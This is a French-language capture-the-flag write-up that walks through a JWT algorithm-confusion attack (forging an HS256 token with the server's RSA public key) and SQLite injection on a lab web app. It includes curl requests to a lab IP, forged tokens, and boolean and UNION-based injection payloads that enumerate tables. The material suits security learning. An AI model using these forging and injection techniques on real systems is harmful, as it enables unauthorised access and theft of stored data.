# Under construction

Le code du projet est donné, analyse du code:

On peut voir que une section du code est vulnérable à une injection SQL mais il faut passer un cookie valide pour utiliser cette partie du code

Code pour injecter des post:

`curl -d '{"username" : "test"}' -H "Content-Type: application/json" -X POST http://159.65.19.122:31249/`

curl -c pour récupérer le cookie:

```java
curl -d '{"username" : "test", "password" : "test"}' -H "Content-Type: application/json" -X POST http://159.65.19.122:31249/auth -c cookie.txt
```

Analyse de la forme des requetes avec burp:

ce qui fonctionne pour prendre le cookie (en ayant déjà un compte): 

```java
curl -d 'username=test&password=test&login=Login' -H "Content-Type: application/x-www-form-urlencoded" -X POST http://159.65.19.122:31249/auth -c cookie.txt
```

les data des re^quetes sont ensuite protégées par JWT mais qui a une faille 

```java
eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
```

séparé par des points: header, payload, signature, le tout (base64url-encoded)

Utilisation de [https://token.dev/](https://token.dev/) pour forger un token à partir d’une vulnérabilité de la méthode de signature: confusion en symmétriquet et asymm

la publickey du serveur:

```java
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY
ktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi
XuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg
jIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH
+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx
V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
0wIDAQAB
-----END PUBLIC KEY-----

```

Token original

```markdown
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2Njc0MTYzODJ9.YuK8eL6l3DSG5W8DHnZMmd3Y5XRkirkpRYwm7FdDS6r_zq-ymo86pmsfVaozyEwU2009SE2LHR-CLLouV68Y2F_0X2vNoLdlHJNE37mTiQSS3TV5nYOFa88U1PhvEgegUVvAL6Oj050r4X7rMd3HF_02Y8BsrsZEsq8SAQflsMtJrK5c5x0ZqJ9VUQdOdIEl0Fb1r0sII_hQcByC-EOJGOzWZopUYrWy5PK20Ty23qng8RCDIv7Vcg1of-atPq4zVLcY2GJY37iDoQA6xYn8hvpX-lxGUYseYZsFUGQOGZmARID-ISoBfEvPrc0RLwtVvEU8UGOmWgtazHO5q380-g
```

internal server error parce qu’il manquait le linebreak à la fin de la clé…

Exemple de token forgé:

```markdown
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QyIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE5NW9UbTlETnpjSHI4Z0xoalphWVxua3RzYmoxS3h4VU9vencwdHJQOTNCZ0lwWHY2V2lwUVJCNWxxb2ZQbFU2RkI5OUpjNVFaMDQ1OXQ3M2dnVkRRaVxuWHVDTUkyaG9VZkoxVm1qTmVXQ3JTckRVaG9rSUZaRXVDdW1laHd3dFVOdUV2MGV6QzU0WlRkRUM1WVNUQU96Z1xuaklXYWxzSGovZ2E1WkVEeDNFeHQwTWg1QUV3YkFENzMrcVhTL3VDdmhmYWpncHpIR2Q5T2dOUVU2MExNZjJtSFxuK0Z5bk5zak5Od281blJlN3RSMTJXYjJZT0N4dzJ2ZGFtTzFuMWtmL1NNeXBTS0t2T2dqNXkwTEdpVTNqZVhNeFxuVjhXUytZaVlDVTVPQkFtVGN6Mncya3pCaFpGbEg2Uks0bXF1ZXhKSHJhMjNJR3Y1VUo1R1ZQRVhwZENxSzNUclxuMHdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLVxuIiwiaWF0IjoxNjY3NDkzMzE3fQ.v0D00JLCjgX04gIxz-5xIcXyT4kiwVg-gia_bHluHn0
```

Query pour découvrir la structure de la BDD (on sait que c’est SQLite3 d’après le code)

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/SQLite Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

L’utilisateur que j’ai créé est “test” donc je sais qu’il est déjà dans la database, on se sert du AND pour savoir si la query qu’on injecte retourne la valeur “true” sinon le serveur va nous dire que la requete à fail.

```sql
test' AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < 2 --
```

Il y a moins de 3 tables.

Il y a exactement 2 tables.

Après recherche de technique d’énumération, il y a possibilité d’exploiter l’union de table (sqlite_master est présente par défaut et on connait sa structure)

Rappel: il faut exactement le même nombre de colonnes dans les deux parties de l’union

```sql
test' union select 1,name,2 from sqlite_master where type='table' and name not like 'sqlite_%' --
```

la page retournée comporte ça:

```sql
<div class="card-body">
                    Welcome flag_storage<br>
                    This site is under development. <br>
                    Please come back later.
                </div>
```

On connait alors le nom de la table

On modifie alors la query précédente pour trouver le nom des colonnes (ça affiche le code qui a créé la table grâce au contenu de la colonne sql

```sql
test' union select 1,sql,2 from sqlite_master where tbl_name ='flag_storage' and type='table' limit 1 --
```

à partir de là facile de deviner comment récupérer le flag :)